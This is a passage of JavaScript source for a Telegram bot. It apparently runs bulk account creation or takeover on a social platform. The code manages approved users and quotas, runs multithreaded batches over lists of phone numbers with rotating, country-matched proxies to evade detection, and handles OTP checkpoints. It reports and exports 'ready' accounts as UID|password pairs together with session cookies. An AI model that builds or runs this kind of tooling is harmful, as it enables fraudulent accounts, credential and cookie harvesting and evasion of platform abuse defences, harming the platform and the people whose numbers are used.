      lines.push('', `<b>🟡 Pending Approval (${pending.length}):</b>`);
      pending.slice(0, 4).forEach((u) => {
        lines.push(`• ${escapeHtml(u.firstName)} (@${escapeHtml(u.username || 'none')}) — <code>${u.id}</code>`);
        rows.push([
          btnOk(`✅ Approve ${u.id}`, `admin:approve:${u.id}`),
          btnBad(`🚫 Block ${u.id}`, `admin:block:${u.id}`),
        ]);
      });
    }
    if (runningList.length > 0) {
      lines.push('', `<b>⚡ Active Runs:</b>`);
      runningList.slice(0, 3).forEach(([id, runSt]) => {
        lines.push(`• User <code>${id}</code>: <code>${runSt.completed}/${runSt.total}</code> (✅${runSt.okCount} 🔐${runSt.pendingCount})`);
        rows.push([btnBad(`🛑 Stop User ${id}`, `admin:stopuser:${id}`)]);
      });
    }
    rows.push([
      btnNav(`👥 Users (${users.length})`, 'admin:users'),
      btnNav('🏷 Brand & Channel', 'admin:brand'),
    ]);
    rows.push([
      btnNav('⚙️ Policy & Defaults', 'admin:settings'),
      btnNav(`🌐 Global Proxies (${globalPx.length})`, 'admin:proxies'),
    ]);
    rows.push([
      btnNav(`⚡ Live Runs (${runningList.length})`, 'admin:live'),
      btnNav('📊 Global Analytics', 'admin:analytics'),
    ]);
    rows.push([
      btnNav('📦 Backup & Export', 'admin:backup'),
      btnOk('📣 Broadcast', 'admin:broadcast'),
    ]);
    rows.push([
      btnNav('📜 System Logs', 'admin:logs'),
      st.maintenanceMode ? btnBad('🛠 Maint: ON', 'admin:toggle_maint') : btnOk('🟢 Mode: LIVE', 'admin:toggle_maint'),
    ]);
    rows.push([
      btnOk('🔄 Refresh Admin', 'admin:home'),
      btnNav('⬅️ Main Menu', 'menu:home'),
    ]);

    const kb = { inline_keyboard: rows };
    if (editMsgId) await editMessage(chatId, editMsgId, lines.join('\n'), kb);
    else await sendMessage(chatId, lines.join('\n'), kb);
  }

  async function renderAdminBrandMenu(chatId, editMsgId) {
    const st = readSettings();
    const brand = st.brandName || DEFAULT_BRAND_NAME;
    const txt = [
      `🏷 <b>BRAND, OWNER & CHANNEL PROFILE</b>`,
      DIVIDER,
      `🏷 <b>Brand Name:</b> <code>${escapeHtml(brand)}</code>`,
      `👑 <b>Owner Username:</b> ${escapeHtml(st.adminUsername)}`,
      `🔗 <b>Owner Link:</b> <code>${escapeHtml(st.ownerUrl || DEFAULT_OWNER_URL)}</code>`,
      `🆔 <b>Primary Admin ID:</b> <code>${escapeHtml(st.adminId)}</code>`,
      `📢 <b>Official Channel:</b> <code>${escapeHtml(st.channelUrl || DEFAULT_CHANNEL_URL)}</code>`,
      `🔐 <b>Force Join Channel:</b> ${st.requireChannelJoin ? '🟢 ON' : '🔴 OFF'}`,
      ``,
      `💬 <b>Welcome Note:</b>`,
      `<blockquote><i>${escapeHtml(st.welcomeNote)}</i></blockquote>`,
      ``,
      `<i>Note: For Force Join to check membership automatically, add the bot as an Admin in ${escapeHtml(getChannelHandle(st.channelUrl))}.</i>`,
    ].join('\n');
    const kb = {
      inline_keyboard: [
        [
          btnNav('🏷 Edit Brand Name', 'admin:set_brand'),
          btnNav('👑 Edit Owner Link', 'admin:set_owner'),
        ],
        [
          btnNav('📢 Edit Channel URL', 'admin:set_channel'),
          btnNav('💬 Edit Welcome Note', 'admin:set_welcome'),
        ],
        [
          st.requireChannelJoin ? btnOk('🔐 Force Join: ON', 'admin:toggle_forcejoin') : btnBad('🔐 Force Join: OFF', 'admin:toggle_forcejoin'),
          btnNav('🧪 Test Channel Bot', 'admin:test_channel'),
        ],
        [
          btnUrl('📢 Open Channel', st.channelUrl || DEFAULT_CHANNEL_URL, 'primary'),
          btnUrl('👑 Contact Owner', st.ownerUrl || DEFAULT_OWNER_URL, 'success'),
        ],
        [btnNav('⬅️ Admin Panel', 'admin:home')],
      ],
    };
    if (editMsgId) await editMessage(chatId, editMsgId, txt, kb);
    else await sendMessage(chatId, txt, kb);
  }

  async function renderAdminSettings(chatId, editMsgId) {
    const st = readSettings();
    const txt = [
      `⚙️ <b>BOT GLOBAL POLICY & ENGINE DEFAULTS</b>`,
      DIVIDER,
      `🔐 <b>Require Admin Approval:</b> ${st.requireApproval ? '🟢 ON' : '🔴 OFF'}`,
      `📢 <b>Force Channel Join:</b> ${st.requireChannelJoin ? '🟢 ON' : '🔴 OFF'} (${escapeHtml(getChannelHandle(st.channelUrl))})`,
      `🛠 <b>Maintenance Mode:</b> ${st.maintenanceMode ? '🔴 ON (Users Paused)' : '🟢 OFF (Normal)'}`,
      `🌐 <b>Share Global Proxy Pool:</b> ${st.shareGlobalProxies ? '🟢 ON' : '🔴 OFF'}`,
      `🎯 <b>Default Daily Quota:</b> <code>${st.defaultDailyLimit}</code>`,
      `🚀 <b>New User Default Engine:</b> <code>${escapeHtml((st.defaultEngineMode || 'hybrid').toUpperCase())}</code>`,
      `🔍 <b>New User Default GQL Check:</b> ${st.defaultPrecheckGql !== false ? '🟢 ON' : '🔴 OFF'}`,
      ``,
      `💬 <b>Welcome Note:</b>`,
      `<blockquote><i>${escapeHtml(st.welcomeNote)}</i></blockquote>`,
    ].join('\n');
    const kb = {
      inline_keyboard: [
        [
          st.requireApproval ? btnOk('🔐 Approval: ON', 'admin:toggle_approval') : btnBad('🔐 Approval: OFF', 'admin:toggle_approval'),
          st.shareGlobalProxies ? btnOk('🌐 Share Proxies: ON', 'admin:toggle_sharepx') : btnBad('🌐 Share Proxies: OFF', 'admin:toggle_sharepx'),
        ],
        [
          st.maintenanceMode ? btnBad('🛠 Maintenance: ON', 'admin:toggle_maint') : btnOk('🛠 Maintenance: OFF', 'admin:toggle_maint'),
          st.requireChannelJoin ? btnOk('📢 Force Join: ON', 'admin:toggle_forcejoin') : btnBad('📢 Force Join: OFF', 'admin:toggle_forcejoin'),
        ],
        [
          btnNav(`🚀 Def Engine: ${(st.defaultEngineMode || 'hybrid').toUpperCase()}`, 'admin:cycle_def_engine'),
          st.defaultPrecheckGql !== false ? btnOk('🔍 Def GQL: ON', 'admin:toggle_def_gql') : btnBad('🔍 Def GQL: OFF', 'admin:toggle_def_gql'),
        ],
        [
          btnNav('🎯 Set Default Limit', 'admin:set_default_limit'),
          btnNav('💬 Edit Welcome Note', 'admin:set_welcome'),
        ],
        [
          btnNav('🔑 Default Voltx Key', 'admin:set_voltx_key'),
          btnOk('♻️ Sync Engine/GQL to All Users', 'admin:sync_defaults'),
        ],
        [
          btnNav('🏷 Brand & Channel', 'admin:brand'),
          btnNav('⬅️ Admin Panel', 'admin:home'),
        ],
      ],
    };
    if (editMsgId) await editMessage(chatId, editMsgId, txt, kb);
    else await sendMessage(chatId, txt, kb);
  }

  async function renderAdminUsersList(chatId, filter = 'all', editMsgId) {
    const allUsers = Object.values(readUsersMap()).sort((a, b) => (b.lastActiveAt || 0) - (a.lastActiveAt || 0));
    const filtered = filter === 'all' ? allUsers : allUsers.filter((u) => u.status === filter);
    const listText = filtered
      .slice(0, 15)
      .map((u) => {
        const stIcon = u.status === 'approved' ? '🟢' : u.status === 'blocked' ? '🚫' : '🟡';
        const roleTag = u.role === 'admin' ? '👑' : '';
        return `• ${stIcon}${roleTag} <code>${u.id}</code> ${escapeHtml(u.firstName)} (${u.usedToday}/${u.dailyLimit}) ✅${u.totalOk}`;
      })
      .join('\n');
    const userButtons = [];
    const userBtn = (u) => {
      const label = `⚙️ ${u.firstName.slice(0, 10)} (${u.id.slice(-4)})`;
      if (u.status === 'blocked') return btnBad(label, `admin:uview:${u.id}`);
      if (u.status === 'pending') return btnOk(label, `admin:uview:${u.id}`);
      return btnNav(label, `admin:uview:${u.id}`);
    };
    for (let i = 0; i < Math.min(filtered.length, 10); i += 2) {
      const row = [];
      const u1 = filtered[i];
      if (u1) row.push(userBtn(u1));
      const u2 = filtered[i + 1];
      if (u2) row.push(userBtn(u2));
      userButtons.push(row);
    }
    const pendingCnt = allUsers.filter((u) => u.status === 'pending').length;
    userButtons.push([
      btnNav(`${filter === 'all' ? '● ' : ''}All (${allUsers.length})`, 'admin:users:all'),
      btnOk(`${filter === 'approved' ? '● ' : ''}✅ Approved`, 'admin:users:approved'),
      btnBad(`${filter === 'blocked' ? '● ' : ''}🚫 Blocked`, 'admin:users:blocked'),
    ]);
    userButtons.push([
      btnNav('🔍 Find User', 'admin:ufind'),
      pendingCnt > 0 ? btnOk(`✅ Approve All (${pendingCnt})`, 'admin:approve_all_pending') : btnNav(`🟡 Pending (0)`, 'admin:users:pending'),
    ]);
    userButtons.push([
      btnBad('🔄 Reset All Today Quotas', 'admin:reset_all_quotas'),
      btnNav('⬅️ Admin Home', 'admin:home'),
    ]);
    const txt = `👥 <b>USERS MANAGEMENT (${filtered.length}/${allUsers.length})</b>\n${DIVIDER}\n<i>Tap a user below to manage quota, exports, or permissions:</i>\n\n${listText || '<i>No users in this view.</i>'}`;
    if (editMsgId) await editMessage(chatId, editMsgId, txt, { inline_keyboard: userButtons });
    else await sendMessage(chatId, txt, { inline_keyboard: userButtons });
  }

  async function renderAdminGlobalProxies(chatId, editMsgId) {
    const list = readGlobalProxies();
    const preview = list
      .slice(0, 10)
      .map((p, i) => {
        const h = proxyHealth.get(p);
        const tag = h
          ? h.streakFail >= 2
            ? ` 🔴 (${escapeHtml(h.lastErr || 'fail')})`
            : h.lastLatencyMs
            ? ` 🟢 ${h.lastLatencyMs}ms${h.exitIp ? ` [${escapeHtml(h.exitIp)}]` : ''}`
            : ''
          : '';
        return `${i + 1}. <code>${escapeHtml(p)}</code>${tag}`;
      })
      .join('\n');
    const txt = [
      `🌐 <b>GLOBAL ADMIN PROXY POOL (${list.length})</b>`,
      DIVIDER,
      preview || '<i>No global proxies configured yet.</i>',
      list.length > 10 ? `<i>... +${list.length - 10} more</i>` : '',
    ].filter(Boolean).join('\n');
    const kb = {
      inline_keyboard: [
        [
          btnOk('➕ Add Global Proxies', 'admin:px_add'),
          btnNav('🧪 Test Global', 'admin:px_test'),
        ],
        [
          btnOk('⚡ Sort by Speed', 'admin:px_sort'),
          btnBad('🧹 Prune Dead', 'admin:px_prune'),
        ],
        [
          btnBad('🗑 Clear All', 'admin:px_clear'),
          btnNav('⬅️ Admin Panel', 'admin:home'),
        ],
      ],
    };
    if (editMsgId) await editMessage(chatId, editMsgId, txt, kb);
    else await sendMessage(chatId, txt, kb);
  }

  async function renderAdminUserDetail(chatId, targetId, editMsgId) {
    const map = readUsersMap();
    const u = map[targetId];
    if (!u) {
      await sendMessage(chatId, '❌ User not found.', {
        inline_keyboard: [[btnNav('⬅️ Back to Users', 'admin:users')]],
      });
      return;
    }
    const run = activeRuns.get(targetId);
    const uCfg = readUserConfig(targetId);
    const uPxCnt = readUserProxies(targetId).length;
    const uPendCnt = readUserPending(targetId).length;
    const uDoneCnt = readUserDone(targetId).size;
    const statusBadge = u.status === 'approved' ? '🟢 APPROVED' : u.status === 'blocked' ? '🚫 BLOCKED' : '🟡 PENDING';
    const lastSeen = u.lastActiveAt ? new Date(u.lastActiveAt).toISOString().replace('T', ' ').slice(0, 16) : '-';
    const txt = [
      `👤 <b>USER CONTROL • ${escapeHtml(u.firstName)}</b>`,
      DIVIDER,
      `🆔 <b>ID:</b> <code>${escapeHtml(u.id)}</code>`,
      `🔗 <b>Username:</b> @${escapeHtml(u.username || 'none')}`,
      `📌 <b>Status:</b> ${statusBadge}  •  <b>Role:</b> ${escapeHtml(u.role.toUpperCase())}`,
      `🎯 <b>Today Quota:</b> <code>${u.usedToday} / ${u.dailyLimit}</code>`,
      `⚙️ <b>Config:</b> CC <code>+${escapeHtml(uCfg.cc)}</code> • Engine <code>${escapeHtml((uCfg.engine_mode || 'hybrid').toUpperCase())}</code> • GQL ${uCfg.precheck_gql !== false ? '🟢' : '🔴'}`,
      `🌐 <b>User Proxies:</b> <code>${uPxCnt}</code>  •  🔐 <b>OTPs:</b> <code>${uPendCnt}</code>  •  ✔️ <b>Done:</b> <code>${uDoneCnt}</code>`,
      `📊 <b>Lifetime:</b> ✅ <code>${u.totalOk}</code>  •  🔐 <code>${u.totalPending}</code>  •  ❌ <code>${u.totalFail}</code>`,
      `⚡ <b>Active Run:</b> <b>${run?.running ? `🟢 ${run.completed}/${run.total}` : '⚪ IDLE'}</b>  •  🕒 <code>${lastSeen}</code>`,
    ].join('\n');
    const isPrimary = u.id === DEFAULT_ADMIN_ID;
    const kb = {
      inline_keyboard: [
        [
          btnOk('✅ Approve', `admin:uapprove:${u.id}`),
          btnBad('🚫 Block', `admin:ublock:${u.id}`),
        ],
        [
          btnNav('🎯 Set Daily Limit', `admin:ulimit:${u.id}`),
          btnNav('🔄 Reset Today Used', `admin:ureset:${u.id}`),
        ],
        [
          btnOk('📩 DM User', `admin:udm:${u.id}`),
          btnNav('📄 Export Ready', `admin:uexport:${u.id}`),
        ],
        [
          btnBad('🧹 Clear Done/OTP', `admin:uclear_done:${u.id}`),
          ...(!isPrimary ? [btnNav(u.role === 'admin' ? '⬇️ Demote User' : '👑 Make Admin', `admin:urole:${u.id}`)] : []),
        ],
        ...(run?.running ? [[btnBad('🛑 Stop User Run', `admin:stopuser:${u.id}`)]] : []),
        [btnNav('⬅️ Back to Users', 'admin:users')],
      ],
    };
    if (editMsgId) await editMessage(chatId, editMsgId, txt, kb);
    else await sendMessage(chatId, txt, kb);
  }

  async function renderAdminLiveRuns(chatId, editMsgId) {
    const runningList = Array.from(activeRuns.entries()).filter(([, r]) => r.running);
    const usersMap = readUsersMap();
    const lines = [
      `⚡ <b>LIVE BATCH RUNS & SERVER MONITOR</b>`,
      DIVIDER,
    ];
    const rows = [];
    if (runningList.length === 0) {
      lines.push(`<i>No active batch runs are currently running.</i>`);
    } else {
      runningList.forEach(([id, r]) => {
        const u = usersMap[id];
        const elapsed = formatDuration(Math.floor((Date.now() - (r.startedAt || Date.now())) / 1000));
        lines.push(
          `• <b>${escapeHtml(u?.firstName || id)}</b> (<code>${escapeHtml(id)}</code>) — <code>${renderProgressBar(r.completed, r.total, 8)}</code> (<code>${r.completed}/${r.total}</code>)`,
          `  📱 Current: <code>+${escapeHtml(r.currentNumber || '-')}</code> • ✅${r.okCount} 🔐${r.pendingCount} ❌${r.failCount} • ⏱ ${elapsed}`
        );
        rows.push([
          btnNav(`👤 Inspect ${id.slice(-4)}`, `admin:uview:${id}`),
          btnBad(`🛑 Stop ${id.slice(-4)}`, `admin:stopuser:${id}`),
        ]);
      });
      rows.push([btnBad(`🛑 Emergency Stop ALL (${runningList.length})`, 'admin:stop_all')]);
    }
    const memMb = Math.round(process.memoryUsage().rss / 1024 / 1024);
    const upSec = startedAt ? Math.floor((Date.now() - startedAt) / 1000) : 0;
    lines.push(``, `🖥 <b>Runtime:</b> Node <code>${escapeHtml(process.version)}</code> • RAM <code>${memMb}MB</code> • Uptime <code>${formatDuration(upSec)}</code>`);
    rows.push([
      btnOk('🔄 Refresh Live', 'admin:live'),
      btnNav('⬅️ Admin Panel', 'admin:home'),
    ]);
    const txt = lines.join('\n');
    const kb = { inline_keyboard: rows };
    if (editMsgId) await editMessage(chatId, editMsgId, txt, kb);
    else await sendMessage(chatId, txt, kb);
  }

  async function renderAdminAnalytics(chatId, editMsgId) {
    const st = readSettings();
    const users = Object.values(readUsersMap());
    let accTotal = 0;
    let accOk = 0;
    let accOtp = 0;
    let accUsed = 0;
    let accLimit = 0;
    let accFail = 0;
    let totalDoneHist = 0;
    let totalUserProxies = 0;

    for (const u of users) {
      const accs = readUserAccounts(u.id);
      accTotal += accs.length;
      accOk += accs.filter((a) => a.status === 'OK').length;
      accOtp += accs.filter((a) => a.status === 'CONFIRM' || a.status === 'CHECKPOINT').length;
      accUsed += accs.filter((a) => a.status === 'USED').length;
      accLimit += accs.filter((a) => a.status === 'LIMIT').length;
      accFail += accs.filter((a) => a.status === 'FAIL' || a.status === 'BADNUM').length;
      totalDoneHist += readUserDone(u.id).size;
      totalUserProxies += readUserProxies(u.id).length;
    }

    const rate = accTotal > 0 ? Math.round((accOk / accTotal) * 100) : 0;
    const topUsers = [...users]
      .sort((a, b) => (b.totalOk || 0) - (a.totalOk || 0))
      .slice(0, 5)
      .map((u, i) => `${i + 1}. ${escapeHtml(u.firstName)} (<code>${u.id}</code>) — ✅ <code>${u.totalOk || 0}</code> • 🔐 <code>${u.totalPending || 0}</code>`)
      .join('\n');

    const txt = [
      `📊 <b>${escapeHtml(st.brandName || DEFAULT_BRAND_NAME)} • GLOBAL ANALYTICS</b>`,
      DIVIDER,
      `👥 <b>Registered Users:</b> <code>${users.length}</code> (✅ ${users.filter((u) => u.status === 'approved').length} approved)`,
      `📦 <b>Logged Attempts:</b> <code>${accTotal}</code> (<b>${rate}%</b> Ready Rate)`,
      `├ ✅ <b>Ready OK:</b> <code>${accOk}</code>  •  🔐 <b>OTP/CP:</b> <code>${accOtp}</code>`,
      `├ ⚠️ <b>Used:</b> <code>${accUsed}</code>  •  ⏳ <b>Limit:</b> <code>${accLimit}</code>  •  ❌ <b>Fail:</b> <code>${accFail}</code>`,
      `└ ✔️ <b>Done History:</b> <code>${totalDoneHist}</code>  •  🌐 <b>Total Proxies:</b> <code>${totalUserProxies + readGlobalProxies().length}</code>`,
      ``,
      `🏆 <b>Top Performers</b>`,
      topUsers || '<i>No user activity yet.</i>',
    ].join('\n');
    const kb = {
      inline_keyboard: [
        [
          btnOk('🔄 Refresh Stats', 'admin:analytics'),
          btnNav('📦 Export Center', 'admin:backup'),
        ],
        [btnNav('⬅️ Admin Panel', 'admin:home')],
      ],
    };
    if (editMsgId) await editMessage(chatId, editMsgId, txt, kb);
    else await sendMessage(chatId, txt, kb);
  }

  async function renderAdminBackupMenu(chatId, editMsgId) {
    const st = readSettings();
    const users = Object.values(readUsersMap());
    let readyCount = 0;
    for (const u of users) {
      readyCount += readUserAccounts(u.id).filter((a) => a.status === 'OK').length;
    }
    const txt = [
      `📦 <b>${escapeHtml(st.brandName || DEFAULT_BRAND_NAME)} • BACKUP & EXPORT CENTER</b>`,
      DIVIDER,
      `👥 <b>Users DB:</b> <code>${users.length}</code> users`,
      `✅ <b>Global Ready Accounts:</b> <code>${readyCount}</code>`,
      `🌐 <b>Global Proxies:</b> <code>${readGlobalProxies().length}</code>`,
      ``,
      `<i>Choose an export bundle to download instantly in Telegram:</i>`,
    ].join('\n');
    const kb = {
      inline_keyboard: [
        [
          btnOk(`📄 All Ready UID|Pass (${readyCount})`, 'admin:dl_all_ready'),
          btnNav('📊 All Accounts CSV', 'admin:dl_all_csv'),
        ],
        [
          btnNav('👥 Users DB (.json)', 'admin:dl_users'),
          btnNav('🌐 Global Proxies (.txt)', 'admin:dl_proxies'),
        ],
        [
          btnNav('📜 System Debug Log (.txt)', 'admin:dl_syslog'),
          btnNav('⬅️ Admin Panel', 'admin:home'),
        ],
      ],
    };
    if (editMsgId) await editMessage(chatId, editMsgId, txt, kb);
    else await sendMessage(chatId, txt, kb);
  }

  async function renderAdminLogsMenu(chatId, editMsgId) {
    let lines = [];
    try {
      if (fs.existsSync(FILES.debugLog)) {
        lines = fs.readFileSync(FILES.debugLog, 'utf-8').split(/\r?\n/).filter(Boolean).slice(-28);
      }
    } catch {
      lines = [];
    }
    const body = lines.join('\n') || 'No system logs recorded yet.';
    const capped = body.length > 2600 ? '...\n' + body.slice(-2600) : body;
    const txt = [
      `📜 <b>SYSTEM EVENT LOGS (${lines.length})</b>`,
      DIVIDER,
      `<blockquote><code>${escapeHtml(capped)}</code></blockquote>`,
    ].join('\n');
    const kb = {
      inline_keyboard: [
        [
          btnNav('📄 Download Full Log', 'admin:dl_syslog'),
          btnBad('🗑 Clear System Logs', 'admin:clear_logs'),
        ],
        [
          btnOk('🔄 Refresh Logs', 'admin:logs'),
          btnNav('⬅️ Admin Panel', 'admin:home'),
        ],
      ],
    };
    if (editMsgId) await editMessage(chatId, editMsgId, txt, kb);
    else await sendMessage(chatId, txt, kb);
  }

  async function broadcastMessage(text) {
    const clean = text.trim();
    if (!clean) return 0;
    const st = readSettings();
    const users = Object.values(readUsersMap()).filter((u) => u.status === 'approved');
    let count = 0;
    for (const u of users) {
      const r = await sendMessage(
        u.id,
        `📣 <b>${escapeHtml(st.brandName || DEFAULT_BRAND_NAME)} ADMIN ANNOUNCEMENT</b>\n${DIVIDER}\n<blockquote>${escapeHtml(clean)}</blockquote>`,
        {
          inline_keyboard: [
            [
              btnUrl('📢 Channel', st.channelUrl || DEFAULT_CHANNEL_URL, 'primary'),
              btnNav('⬅️ Main Menu', 'menu:home'),
            ],
          ],
        }
      );
      if (r.ok) count += 1;
    }
    pushBotLog(`Broadcast delivered to ${count}/${users.length} approved users`);
    return count;
  }

  async function startUserBatchRun(chatId, user, rawText, presetQueue) {
    const existingRun = activeRuns.get(user.id);
    if (existingRun?.running) {
      await sendMessage(
        chatId,
        `⚠️ <b>Active Run Detected</b>\nYou already have a batch running (<code>${existingRun.completed}/${existingRun.total}</code>). Stop it first.`,
        { inline_keyboard: [[btnBad('🛑 Stop Active Run', 'menu:stop'), btnNav('⬅️ Main Menu', 'menu:home')]] }
      );
      return;
    }

    const cfg = readUserConfig(user.id);
    if (!cfg.password || cfg.password.length < 6) {
      await sendMessage(
        chatId,
        `❌ <b>Default Password Required</b>\nPlease set a default password (minimum 6 characters) before running numbers.`,
        { inline_keyboard: [[btnOk('🔑 Set Password Now', 'set:pw'), btnNav('⬅️ Main Menu', 'menu:home')]] }
      );
      return;
    }

    const st = readSettings();
    const useResume = cfg.resume_mode !== false;
    const doneSet = readUserDone(user.id);
    const seen = new Set();
    const queue = [];
    let invalidCount = 0;
    let skippedDone = 0;

    if (presetQueue && presetQueue.length > 0) {
      for (const n of presetQueue) {
        if (useResume && doneSet.has(n)) {
          skippedDone += 1;
          continue;
        }
        queue.push(n);
      }
    } else {
      for (const line of rawText.split(/[\r\n,\s]+/)) {
        const trimmed = line.trim();
        if (!trimmed) continue;
        const n = normNumber(trimmed, cfg.cc);
        if (!n) {
          invalidCount += 1;
          continue;
        }
        if (seen.has(n)) continue;
        seen.add(n);
        if (useResume && doneSet.has(n)) {
          skippedDone += 1;
          continue;
        }
        queue.push(n);
      }
    }

    if (queue.length === 0) {
      await sendMessage(
        chatId,
        `⚠️ <b>No Valid New Numbers Found</b>\n❌ Invalid: <code>${invalidCount}</code>  •  ⏭ Skipped Done: <code>${skippedDone}</code>`,
        { inline_keyboard: [[btnOk('🚀 Try Again', 'menu:run'), btnNav('⬅️ Main Menu', 'menu:home')]] }
      );
      return;
    }

    const remainingQuota = Math.max(0, user.dailyLimit - user.usedToday);
    if (user.role !== 'admin' && remainingQuota <= 0) {
      await sendMessage(
        chatId,
        `⛔ <b>Daily Quota Reached</b>\nUsage: <code>${user.usedToday}/${user.dailyLimit}</code>\n\n<blockquote>Contact ${escapeHtml(st.adminUsername)} to raise your daily limit.</blockquote>`,
        { inline_keyboard: [[btnNav('⬅️ Main Menu', 'menu:home')]] }
      );
      return;
    }

    const finalQueue = user.role === 'admin' ? queue : queue.slice(0, remainingQuota);
    const runState = {
      running: true,
      total: finalQueue.length,
      completed: 0,
      okCount: 0,
      pendingCount: 0,
      failCount: 0,
      currentNumber: finalQueue[0] ?? null,
      abortRequested: false,
      startedAt: Date.now(),
    };
    activeRuns.set(user.id, runState);

    const statusRes = await sendMessage(
      chatId,
      [
        `🚀 <b>BATCH RUN STARTED</b>`,
        DIVIDER,
        `📋 <b>Queue:</b> <code>${finalQueue.length}</code> numbers (CC: <code>+${escapeHtml(cfg.cc)}</code>)`,
        `⏭ <b>Skipped Done:</b> <code>${skippedDone}</code>  •  ❌ <b>Invalid:</b> <code>${invalidCount}</code>`,
        `📊 <b>Progress:</b> <code>${renderProgressBar(0, finalQueue.length)}</code> (<code>0/${finalQueue.length}</code>)`,
      ].join('\n'),
      { inline_keyboard: [[btnBad('🛑 Stop Run', 'menu:stop')]] }
    );
    const progressMsgId = statusRes.ok && statusRes.result?.message_id ? statusRes.result.message_id : null;

    pushBotLog(`User ${user.id} started batch (${finalQueue.length} numbers)`);
    appendUserLog(user.id, `BATCH STARTED: ${finalQueue.length} numbers (cc=+${cfg.cc})`);

    (async () => {
      const userProxies = readUserProxies(user.id);
      const proxyPool = userProxies.length > 0 ? userProxies : st.shareGlobalProxies ? readGlobalProxies() : [];
      const userBaseCookie = readUserCookies(user.id);
      const failureDetails = [];
      const badProxies = new Set();
      const threads = Math.max(1, Math.min(8, Number(cfg.threads ?? 3)));
      const delaySecBase = Math.max(0, Number(cfg.delay ?? 2));
      let nextIdx = 0;
      let lastProgEditAt = 0;

      const updateProgress = async (statusLine = '', force = false) => {
        if (!progressMsgId) return;
        const now = Date.now();
        if (!force && now - lastProgEditAt < 2500) return;
        lastProgEditAt = now;
        await editMessage(
          chatId,
          progressMsgId,
          [
            `⚡ <b>BATCH PROGRESS (${threads}x TURBO)</b>`,
            DIVIDER,
            statusLine || `📱 <b>Active:</b> <code>+${escapeHtml(runState.currentNumber || '-')}</code>`,
            `🚀 <b>Engine:</b> <code>${escapeHtml((cfg.engine_mode || 'hybrid').toUpperCase())}</code>  •  🔍 <b>GQL:</b> ${cfg.precheck_gql !== false ? 'ON' : 'OFF'}  •  ♻️ <b>Auto-IP:</b> ${cfg.auto_proxy_refresh !== false ? 'ON' : 'OFF'}`,
            `📊 <b>Progress:</b> <code>${renderProgressBar(runState.completed, finalQueue.length)}</code> (<code>${runState.completed}/${finalQueue.length}</code>)`,
            `✅ Ready: <code>${runState.okCount}</code>  •  🔐 OTP: <code>${runState.pendingCount}</code>  •  ❌ Fail: <code>${runState.failCount}</code>`,
          ].join('\n'),
          { inline_keyboard: [[btnBad('🛑 Stop Run', 'menu:stop')]] },
          { throttle: true, noRetry: true, minIntervalMs: force ? 1200 : 2500 }
        );
      };

      const worker = async () => {
        while (!runState.abortRequested) {
          const i = nextIdx++;
          if (i >= finalQueue.length) break;
          const phone = finalQueue[i];
          if (!phone) continue;
          runState.currentNumber = phone;
          const numDet = detectCountryFromNumber(`+${phone}`, cfg.cc);
          const numIso = (cfg.auto_proxy_country !== false && numDet?.iso && numDet.iso !== '??')
            ? numDet.iso
            : getCountryInfo(cfg.cc)[1];
          const numCName = numDet?.name || getCountryInfo(cfg.cc)[0];
          const healthyPool = proxyPool.filter((p) => !badProxies.has(p) && !badProxies.has(proxyHealthKey(p)));
          const activePool = healthyPool.length > 0 ? healthyPool : proxyPool;
          const px = selectSmartProxy(activePool, i, badProxies, cfg.proxy_mode || 'rotate', cfg.proxy || null);
          const pxPreview = adaptProxyForSession(px, {
            iso: numIso,
            autoCountry: cfg.auto_proxy_country !== false,
            refreshSession: cfg.auto_proxy_refresh !== false,
          });
          const pxHost = px ? (() => { try { return new URL(px).hostname; } catch { return 'proxy'; } })() : 'Direct IP';
          const pxHealth = px ? proxyHealth.get(proxyHealthKey(px)) : null;
          const routeDesc = px
            ? `Proxy (${escapeHtml(pxHost)} • <b>${escapeHtml(pxPreview.isoApplied || numIso)}</b>${pxPreview.sessionId ? ` • <code>ssid:${escapeHtml(pxPreview.sessionId.slice(0, 6))}</code>` : ''}${pxHealth?.exitIp ? ` → ${escapeHtml(pxHealth.exitIp)}` : ''})`
            : 'Direct IP';

          await updateProgress(
            `⏳ <b>Working on:</b> <code>+${escapeHtml(phone)}</code> [${escapeHtml(numCName)} • <b>${escapeHtml(numIso)}</b>] (<code>${i + 1}/${finalQueue.length}</code>)\n🌐 <b>Route:</b> ${routeDesc} • 🛡 Strict: ${cfg.strict_proxy !== false ? 'ON' : 'OFF'}`,
            i === 0
          );

          const res = await runNodeAttempt(phone, cfg.password, cfg, px, {
            baseCookiesRaw: userBaseCookie,
            shouldAbort: () => runState.abortRequested,
            proxiesPool: activePool,
            badProxies,
            countryHint: numCName,
            onDebug: (msg) => appendUserLog(user.id, msg),
          });

          if (res.debugHtml) saveUserDebugHtml(user.id, res.debugHtml);

          markUserDone(user.id, phone);
          runState.completed += 1;

          const resCountryName = res.countryName || numCName;
          const resCountryIso = res.countryIso || numIso;
          const resProxyIso = res.proxyIso || resCountryIso;

          if (res.status === 'OK') {
            const usersMap = readUsersMap();
            const uRec = usersMap[user.id];
            if (uRec) {
              uRec.usedToday += 1;
              uRec.totalOk += 1;
              uRec.lastActiveAt = Date.now();
              writeUsersMap(usersMap);
            }
            runState.okCount += 1;
            storeUserAccount(user.id, {
              name: res.name,
              phone,
              pass: cfg.password,
              uid: res.uid,
              status: 'OK',
              confirmed: true,
              printer: res.printer,
              engine: res.engine,
              cookies: res.cookies,
            });
            const cstr = formatCookieHeader(res.cookies || {});
            await sendMessage(
              chatId,
              [
                `✅ <b>ACCOUNT READY</b>`,
                DIVIDER,
                `👤 <b>Profile:</b> ${escapeHtml(res.name)} [${escapeHtml(resCountryName)} • <b>${escapeHtml(resCountryIso)}</b>]`,
                `📱 <b>Number:</b> <code>+${escapeHtml(phone)}</code>`,
                `🔑 <b>UID|Pass:</b> <code>${escapeHtml(res.uid)}|${escapeHtml(cfg.password)}</code>`,
                `🌐 <b>Proxy Route:</b> <code>${escapeHtml(resProxyIso)}</code>  •  ⚙️ <code>${escapeHtml(res.engine || 'limited')}</code>`,
                ``,
                `<blockquote>🍪 <code>${escapeHtml(cstr.slice(0, 260))}${cstr.length > 260 ? '...' : ''}</code></blockquote>`,
              ].join('\n'),
              {
                inline_keyboard: [
                  [
                    btnOk('📦 View Accounts', 'menu:accounts'),
                    btnNav('⬅️ Main Menu', 'menu:home'),
                  ],
                ],
              }
            );
          } else if (res.status === 'CONFIRM' || res.status === 'CHECKPOINT') {
            let finalItem = res.pendingPayload || null;
            const configuredResends = Math.max(0, Math.min(3, Number(cfg.auto_otp_resend ?? 2)));
            let autoResendRes = null;

            if (finalItem) {
              upsertUserPending(user.id, finalItem);
              if (configuredResends > 0 && !runState.abortRequested) {
